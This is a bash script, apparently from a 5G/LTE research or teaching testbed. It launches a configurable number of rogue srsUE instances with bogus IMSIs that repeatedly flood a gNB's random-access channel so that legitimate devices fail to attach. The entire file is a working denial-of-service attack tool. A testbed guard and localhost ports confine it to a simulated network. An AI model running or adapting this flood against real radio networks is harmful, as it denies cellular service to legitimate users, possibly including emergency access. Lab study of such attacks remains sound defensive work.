#!/bin/bash
# Control-plane RACH flood: launch many rogue srsUE instances that hammer the
# gNB's random-access channel, so legitimate UEs struggle to attach. This is
# the deliberate version of the preamble-collision problem.
#
# Rogue UEs use bogus (unprovisioned) IMSIs: they complete random access, fail
# authentication, get released, and retry - sustaining RACH/Msg2/Msg3 load.
#
# PREREQUISITE: run the broker with enough attacker slots, e.g.
#     ATTACK_SLOTS=16 python3 attack-broker.py
# (start the gNB and the 3 legit UEs as usual first).
#
# Usage:  sudo ./flood-rach.sh [num_rogue_ues] [duration_secs]
# Default: 12 rogue UEs for 30s.
set -euo pipefail
cd "$(dirname "$0")"
source ./lib-guard.sh

N="${1:-12}"
SECS="${2:-30}"
TEMPLATE=../../config/ue1.conf
ATTACK_BASE=2400            # must match attack-broker.py
IMSI_BASE=999700000009000   # bogus, unprovisioned range

[ "$(id -u)" -eq 0 ] || { echo "Run with sudo." >&2; exit 1; }
require_testbed
[ -f "$TEMPLATE" ] || { echo "Missing $TEMPLATE" >&2; exit 1; }
pgrep -f attack-broker.py >/dev/null || {
    echo "attack-broker.py is not running. Start it first with ATTACK_SLOTS>=$N:" >&2
    echo "    ATTACK_SLOTS=$N python3 attack-broker.py" >&2
    exit 1
}

SRSUE=/opt/srsRAN_4G/build/srsue/src/srsue
WORK="$(mktemp -d)"
PIDS=()

cleanup() {
    echo "Stopping rogue UEs..."
    for p in "${PIDS[@]:-}"; do kill "$p" 2>/dev/null || true; done
    sleep 1
    for i in $(seq 1 "$N"); do ip netns del "atk$i" 2>/dev/null || true; done
    rm -rf "$WORK"
}
trap cleanup EXIT

echo "=== RACH flood: $N rogue UEs for ${SECS}s ==="
for i in $(seq 1 "$N"); do
    rx=$((ATTACK_BASE + 2 * (i - 1)))
    tx=$((rx + 1))
    imsi=$((IMSI_BASE + i))
    conf="$WORK/atk$i.conf"
    ip netns add "atk$i" 2>/dev/null || true
    sed -e "s#tx_port=tcp://127.0.0.1:2101,rx_port=tcp://127.0.0.1:2100#tx_port=tcp://127.0.0.1:$tx,rx_port=tcp://127.0.0.1:$rx#" \
        -e "s#^imsi = .*#imsi = $imsi#" \
        -e "s#^netns = .*#netns = atk$i#" \
        -e "s#^filename = .*#filename = /tmp/atk$i.log#" \
        "$TEMPLATE" > "$conf"
    "$SRSUE" "$conf" >/dev/null 2>&1 &
    PIDS+=("$!")
    sleep 0.2   # stagger so they hit different RACH occasions
done

echo "Launched ${#PIDS[@]} rogue UEs (PIDs ${PIDS[*]})."
echo "Watch the gNB window (press 't'): random-access load is now high, and a"
echo "legit UE restarted now will take much longer to attach, or fail."
echo "Flooding for ${SECS}s..."
sleep "$SECS"
echo "Done; cleaning up."
